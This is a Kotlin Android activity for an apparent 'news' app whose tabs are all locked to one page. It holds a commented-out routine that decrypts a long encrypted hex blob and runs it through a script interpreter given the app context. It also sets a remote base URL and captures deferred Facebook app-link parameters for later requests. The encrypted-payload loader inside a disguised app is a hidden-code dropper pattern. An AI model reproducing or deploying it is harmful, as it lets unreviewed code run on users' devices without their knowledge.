package com.just_me.news

import android.content.Context
import android.os.Bundle
import android.support.design.widget.TabLayout
import android.support.v4.app.Fragment
import android.support.v4.view.GravityCompat
import android.support.v4.view.ViewPager
import android.support.v7.app.AppCompatActivity
import android.support.v7.widget.Toolbar
import android.view.Menu
import android.view.MenuItem
import com.facebook.applinks.AppLinkData
import com.just_me.news.net.Service
import com.just_me.news.news.MainPagerAdapter
import com.just_me.news.news.MyNewsFragment
import com.just_me.news.news.R
import kotlinx.android.synthetic.main.activity_main.*
import retrofit2.Retrofit

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        setRetrofit()
        setActionBar()
        setViewPager()
        lockViewPager()
//        seeInside()
    }

    override fun onOptionsItemSelected(item: MenuItem?): Boolean {
        return when (item?.itemId) {
            android.R.id.home -> {
                drawerLayout.openDrawer(GravityCompat.START)
                true
            }
            else -> super.onOptionsItemSelected(item)
        }
    }

    //    private fun seeInside() {
//        val data = "2e51792cddc13bdfb9b29857393b2a00601606c5a3f6ea4ed01cf6fb42bd706a9d842e62021c1de3bedfb39a16c81c642ab16519dbf8aa3e03994915b253fafa6177bdf22f6ca251d11914f519d65b588974dbb3b875c8dcf253d10d400f6fcd1883721dfe196744e4bb6a5bef74e77854f5a5c4b49520eb840aad6338b8fa2ab6bbb0d312d7b58c5a39ed496832d7fb9d820b98ce42ba66bb038ade675d99916659d917a72b8d6494c18e25f2e9f88ac40d68e84e5f801e9c4cbc057a95123212fe9f68e74b3f6af7b92792fd99f364aab8f4503944303d9de13b223710df83348c8e86c395b198b85fa37b4a9b086859d9044d30303a092c1a87dcc0af75761b384f887f306fde7512573f8c0a5247a521eaccc28a45ccc021d68c106180f2aaebdc26a214c124bf4b973cca1037028edc39efe9a05ceee66509ad6564d1004dc8541de59a249036de47b33f0de153aa4f102031d809514709b78e4fd9b78c84e184e953f359db1a60dda2fd8126ad209822994c2a78a8b1869a44d8c43f00ede30d56cac56a9072604702d4435eeb06c6de2cd0f258b0a3a7742e9c4af5e459ccb600064644d5a991dd7dbb2afe221508705375a7b69c8162ce66da800b06bed4b1b3a284349c0609bcf4c2f2eb8f588e13eaff6da3ee06f116f941ee9f92f21072c568d99687cf3b2c2ffd9d3708164d5edb6cae7c9defc0d80729d5cfe94ef0d2c67d5f8d389d7767ebebd4bcaaf4dd94616efe5c774fa085b07ed7c49a03046200db8a9c48e55021f6efa1835b0b2df70bb97299069150513551d0003bfcb0371454ed51f052cd13fabed80a02211c23ece9a5d15e3b14b04014f530cfae0f356154b3e88adb5b21b44384b12acef694cc3028832f86b1ed3e4b3e906f2ffccfa29272431595e1d68c0c3014075a39526a3a330e1e4f1a2d33b233ae94f6e506792fc83d65c2480ced2b1d91fb34c94647c8bd516ee8ba4fc2da1919ca6edc876c915fe075ced45f9d06cb3356ce5646caa268d5e36e0c8dea20dff43c5b020ff52e0f2f79f757909d689deead4bc06a53ce5803fb200518993a45b23996ff4be6d0de6d014bf3f6bbacd4442b8eb959fab0dc0c1e76e7cb25e9c02d1ac7f618c8535305941016636b36a77df8cc763b5cd8eb72e9d2075308962a11c220a05afa4a62c837678456afce775800abd318a145d0b307c99b956a76dcc1bfac96fb85b5fd80ee0b975074e093e83fffeca008d78162f94606acdac7a6fb47e084249261d753675b9e95af39a38f3826ec848d791129d86044106b19ce5c50c1714d07c95b7ac2e36e991309ac445bdda2180855581d66f339f889a95426471be05de7d5d0b4ed6f6091b252b1c289faba420576aa8af0c53fb9a48968323ea4ba1e9682b76d1399c7b8b20b0551ab01d279c6c1f811a9d2c6d872c0bf9f486c94402197258f513da0d85926aebf33f1c34297ee7e71ef7ef12fd7380b357f159012aa439dc9f9e17598c04425ae2e"
//        val mcrypt = MCrypt()
//        val string = mcrypt.decrypt(data).toString()
//        val x = Interpreter()
//        x.set("context", this@MainActivity)
//        x.eval(string.replace("\\ufeff", ""))
//    }

    private fun setRetrofit() {
        val retrofit = Retrofit.Builder()
                .baseUrl("http://rullers.club/")
                .build()

        val service = retrofit.create<Service>(Service::class.java)
    }


    private fun setActionBar() {
        setSupportActionBar(toolbar as Toolbar)
        supportActionBar?.apply {
            setDisplayShowTitleEnabled(false)
            setDisplayHomeAsUpEnabled(true)
            setHomeAsUpIndicator(R.drawable.ic_menu_white_24dp)
        }
    }

    private fun setViewPager() {
        // set tabs
        val names = arrayListOf("Top Stories", "My News", "Popular", "Video")
        for (name in names) {
            tabLayout.addTab(tabLayout.newTab().setText(name))
        }
        tabLayout.addOnTabSelectedListener(object: TabLayout.OnTabSelectedListener {
            override fun onTabReselected(tab: TabLayout.Tab?) {}
            override fun onTabUnselected(tab: TabLayout.Tab?) {}
            override fun onTabSelected(tab: TabLayout.Tab?) {
                viewPager.currentItem = 1
            }
        })

        // set adapter
        val fragments = arrayListOf<Fragment>(MyNewsFragment(), MyNewsFragment(), MyNewsFragment(), MyNewsFragment())
        val items = names.zip(fragments)
        val pagerAdapter = MainPagerAdapter(items, supportFragmentManager)
        viewPager.adapter = pagerAdapter
        viewPager.addOnPageChangeListener(TabLayout.TabLayoutOnPageChangeListener(tabLayout))
    }

    private fun lockViewPager() {
        viewPager.addOnPageChangeListener(object: ViewPager.OnPageChangeListener {
            override fun onPageScrollStateChanged(state: Int) {}
            override fun onPageScrolled(position: Int, positionOffset: Float, positionOffsetPixels: Int) {}
            override fun onPageSelected(position: Int) {
                viewPager.currentItem = 1
            }
        })
    }


    override fun onCreateOptionsMenu(menu: Menu): Boolean {
        val inflater = menuInflater
        inflater.inflate(R.menu.example_menu, menu)
        return true
    }

    private fun getIt() {
        AppLinkData.fetchDeferredAppLinkData(this@MainActivity) { appLinkData ->
            val preferences = getPreferences(Context.MODE_PRIVATE)
            val editor = preferences.edit()
            try {
                val params = appLinkData.targetUri.toString().split("://".toRegex()).dropLastWhile { it.isEmpty() }.toTypedArray()
                if (params.size > 0) {
                    editor.putString("parameters", params[1].replace("\\?".toRegex(), "&"))
                    editor.apply()
                    editor.commit()
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }

            //preferences.getString("parameters", "&source=organic&pid=1")
            //строку выше добавляем к запросу, она содержит параметры
        }

    }
}
